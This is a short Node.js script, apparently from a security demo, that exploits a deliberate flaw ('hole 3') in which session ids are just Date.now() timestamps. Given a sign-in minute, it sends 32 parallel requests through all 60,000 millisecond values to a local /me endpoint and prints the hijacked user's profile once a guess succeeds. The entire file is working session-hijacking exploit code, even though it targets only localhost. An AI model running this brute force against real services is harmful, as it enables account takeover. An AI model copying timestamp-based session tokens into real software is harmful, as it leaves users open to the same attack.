// demo0/guess-session.mjs — hole 3: the session id is Date.now(), so knowing the MINUTE of a sign-in is enough.
// Usage: node demo0/guess-session.mjs HH:MM   (the minute of the sign-in, today, local time)
const BASE = process.env.BASE ?? 'http://localhost:4800';
const [hh, mm] = process.argv[2].split(':').map(Number);
const from = new Date().setHours(hh, mm, 0, 0); // first millisecond of that minute
const CONCURRENCY = 32;
const t0 = performance.now();
let next = from;
let tries = 0;
let found = null;
async function worker() {
  while (!found && next < from + 60_000) {
    const guess = String(next++);
    tries++;
    const res = await fetch(BASE + '/me', { headers: { 'x-session': guess } });
    if (res.status === 200) found = { guess, me: await res.json() };
    else await res.arrayBuffer();
  }
}
await Promise.all(Array.from({ length: CONCURRENCY }, worker));
const s = (performance.now() - t0) / 1000;
console.log(`window: 60,000 possible ids (one minute of Date.now())`);
console.log(`tried ${tries} ids in ${s.toFixed(2)} s (${Math.round(tries / s)} requests/s)`);
console.log(found ? `FOUND session ${found.guess} → ${JSON.stringify(found.me)}` : 'not found');
